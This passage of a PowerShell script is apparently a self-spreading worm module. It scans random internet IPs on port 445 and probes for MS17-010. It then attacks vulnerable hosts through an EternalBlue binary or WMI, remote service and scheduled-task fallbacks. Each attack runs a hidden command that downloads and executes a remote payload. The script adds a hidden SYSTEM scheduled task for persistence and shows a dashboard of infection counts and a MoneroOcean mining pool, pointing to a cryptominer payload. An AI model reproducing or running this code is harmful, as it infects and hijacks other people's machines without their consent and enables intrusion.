    `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$PAYLOAD_URL\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""
    if (`$ebReady -and (Test-Path `$ebExe)) { WLog "Firing compiled EB exploit at `$ip"; try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$ip\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { WLog "EB exploit executed on `$ip"; return `$true } } catch { WLog "EB exploit binary failed: `$(`$_.Exception.Message)" } }
    WLog "Trying PS-based exploitation on `$ip"; `$result = `$false
    foreach (`$m in @(
        { try { `$r = Invoke-WmiMethod -ComputerName `$ip -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return `$true } } catch {}; return `$false },
        { try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$ip create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$ip start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$ip delete \$sn 2>nul" 2>`$null; return `$true } catch {}; return `$false },
        { try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$ip /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$ip /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$ip /tn \$tn /f 2>nul" 2>`$null; return `$true } catch {}; return `$false }
    )) { if (& `$m) { `$result = `$true; break } }
    if (`$result) { WLog "Exploitation succeeded on `$ip" }; return `$result
}

function Test-Gov { try { `$exp = [datetime]::Parse(`$WORM_EXPIRY); if ((Get-Date) -gt `$exp) { WLog "Worm expired"; return `$false } } catch {}; `$cnt = 0; try { if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}; if (`$cnt -ge `$MAX_TARGETS) { WLog "Cap reached: `$cnt/`$MAX_TARGETS"; return `$false }; return `$true }
function Update-Count { try { `$cnt = 0; if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }; `$cnt++; Set-Content -Path "`$BASE\infection_count.txt" -Value `$cnt -Force -ErrorAction SilentlyContinue; WLog "Infection count: `$cnt/`$MAX_TARGETS"; Update-Status "infected" `$cnt } catch {} }

WLog "============================================"; WLog "WORM MODULE STARTING - INTERNET WIDE ONLY"; WLog "Max targets: `$MAX_TARGETS"; WLog "Expiry: `$WORM_EXPIRY"; WLog "EB Exploit: `$ebReady"; WLog "============================================"
if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }

`$batchNum = 0; while ((Test-Gov)) { `$batchNum++; Update-Status "last_action" "Scanning batch `$batchNum (1000 IPs)"; WLog "Phase 1: Internet-wide random IP discovery - Batch `$batchNum (port 445)"
    `$smbHosts = Scan-SMBHosts -Count 1000
    `$scanned = 0; try { `$scanned = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).scanned } catch {}; `$scanned += 1000; Update-Status "scanned" `$scanned; Update-Status "open_445" `$smbHosts.Count
    WLog "SMB hosts found: `$(`$smbHosts.Count)"
    if (`$smbHosts.Count -eq 0) { WLog "No hosts in batch `$batchNum. Next batch immediately..."; Update-Status "last_action" "No hosts found, next batch..."; continue }
    WLog "Phase 2: Parallel vulnerability testing + exploitation"; `$vulnHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    `$vulnPool = [runspacefactory]::CreateRunspacePool(1, 50); `$vulnPool.Open(); `$vulnJobs = @()
    foreach (`$ip in `$smbHosts) { if (-not (Test-Gov)) { break }; `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$vulnPool
        [void]`$ps.AddScript({ param(`$t) try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$null }; `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000; `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00); `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300; `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close(); if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$t }; return `$null } catch { return `$null } })
        [void]`$ps.AddArgument(`$ip); `$vulnJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
    }
    foreach (`$j in `$vulnJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$vulnHosts.Add(`$result[0]); `$vulnCount = 0; try { `$vulnCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).vulnerable } catch {}; `$vulnCount++; Update-Status "vulnerable" `$vulnCount; WLog "`$(`$result[0]) VULNERABLE to MS17-010" }; `$j.PS.Dispose() }
    `$vulnPool.Close(); `$vulnPool.Dispose()
    WLog "Vulnerable hosts: `$(`$vulnHosts.Count)"
    
    `$exploitPool = [runspacefactory]::CreateRunspacePool(1, 10); `$exploitPool.Open(); `$exploitJobs = @()
    foreach (`$ip in `$vulnHosts) { if (-not (Test-Gov)) { break }; Update-Status "last_ip" `$ip; Update-Status "last_action" "Exploiting `$ip..."
        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$exploitPool
        [void]`$ps.AddScript({ param(`$t, `$u, `$ebReady, `$ebExe) `$randChar = [char](Get-Random -Minimum 97 -Maximum 122); `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$u\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""; if (`$ebReady -and (Test-Path `$ebExe)) { try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$t\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { return @(`$true, "EB") } } catch {} }; try { `$r = Invoke-WmiMethod -ComputerName `$t -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return @(`$true, "WMI") } } catch {}; try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$t create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$t start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$t delete \$sn 2>nul" 2>`$null; return @(`$true, "SCM") } catch {}; try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$t /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$t /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$t /tn \$tn /f 2>nul" 2>`$null; return @(`$true, "Task") } catch {}; return @(`$false, "None") })
        [void]`$ps.AddArgument(`$ip); [void]`$ps.AddArgument(`$PAYLOAD_URL); [void]`$ps.AddArgument(`$ebReady); [void]`$ps.AddArgument(`$ebExe); `$exploitJobs += @{ PS = `$ps; Job = `$ps.BeginInvoke(); IP = `$ip }
    }
    foreach (`$j in `$exploitJobs) { if (-not (Test-Gov)) { break }; `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0] -eq `$true) { Update-Count; WLog "INFECTED `$(`$j.IP) via `$(`$result[1]) (Total: `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue)))" } else { `$failCount = 0; try { `$failCount = (Get-Content `$STATUS_FILE -Raw | ConvertFrom-Json).failed } catch {}; `$failCount++; Update-Status "failed" `$failCount; WLog "Exploitation failed on `$(`$j.IP)" }; `$j.PS.Dispose() }
    `$exploitPool.Close(); `$exploitPool.Dispose()
    if ((Test-Gov) -eq `$false) { break }; Start-Sleep -Seconds 2
}
Update-Status "last_action" "WORM COMPLETE - Cap reached or expired"; WLog "============================================"; WLog "WORM COMPLETE - Infected `$((Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue))/`$MAX_TARGETS targets"; WLog "============================================"
"@

[System.IO.File]::WriteAllText($wormScriptPath, $wormScriptContent, (New-Object System.Text.UTF8Encoding $false))

# Register worm as scheduled task for persistence
$wormTaskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <TimeTrigger><StartBoundary>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</StartBoundary><Enabled>true</Enabled><Repetition><Interval>PT30M</Interval></Repetition></TimeTrigger>
  </Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>powershell.exe</Command><Arguments>-W Hidden -EP Bypass -F "$wormScriptPath"</Arguments></Exec></Actions>
</Task>
"@
$wormTaskXmlPath = "$env:TEMP\worm_task.xml"
[System.IO.File]::WriteAllText($wormTaskXmlPath, $wormTaskXml, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "MF-Worm" /XML $wormTaskXmlPath /F 2>$null | Out-Null
Remove-Item $wormTaskXmlPath -Force -ErrorAction SilentlyContinue

# Also run it immediately in background
$job = Start-Job -ScriptBlock $wormScriptBlock -ArgumentList $BASE, $PAYLOAD_URL, $MAX_TARGETS, $WORM_EXPIRY, $ebExe, $ebReady, $STATUS_FILE | Out-Null

# ---- LIVE DASHBOARD ----
Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host "    WORM MODULE ACTIVE (INTERNET-WIDE)" -ForegroundColor Magenta
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host "  Max Targets:  $MAX_TARGETS" -ForegroundColor White
Write-Host "  Expiry:       $WORM_EXPIRY" -ForegroundColor White
Write-Host "  EB Exploit:   $(if ($ebReady) { 'Ready (inline compiled)' } else { 'Fallback (WMI/SCM/Task)' })" -ForegroundColor White
Write-Host "  Payload URL:  GitHub (alphahubv2/alpha-v2)" -ForegroundColor White
Write-Host "  Log:          $WORM_LOG" -ForegroundColor White
Write-Host "  Cap Counter:  $BASE\infection_count.txt" -ForegroundColor White
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "  LIVE STATUS DASHBOARD:" -ForegroundColor Yellow
Write-Host "  Run this in another terminal to watch live progress:" -ForegroundColor Gray
Write-Host ""
Write-Host '    while ($true) { Clear-Host; $s = Get-Content "C:\ProgramData\MF\status.json" -Raw | ConvertFrom-Json; Write-Host "  WORM LIVE STATUS - $(Get-Date -Format "HH:mm:ss")" -ForegroundColor Cyan; Write-Host "  =================================" -ForegroundColor Cyan; Write-Host "  IPs Scanned:   $($s.scanned)" -ForegroundColor White; Write-Host "  Port 445 Open: $($s.open_445)" -ForegroundColor Green; Write-Host "  Vulnerable:    $($s.vulnerable)" -ForegroundColor Yellow; Write-Host "  INFECTED:      $($s.infected) / 50" -ForegroundColor Magenta; Write-Host "  Failed:        $($s.failed)" -ForegroundColor Red; Write-Host "  Last IP:       $($s.last_ip)" -ForegroundColor Gray; Write-Host "  Action:        $($s.last_action)" -ForegroundColor Gray; Write-Host "  =================================" -ForegroundColor Cyan; Start-Sleep 2 }'
Write-Host ""
Write-Host "  Or check MoneroOcean dashboard for live miner count:"
Write-Host "  https://moneroocean.stream" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Magenta
Write-Host ""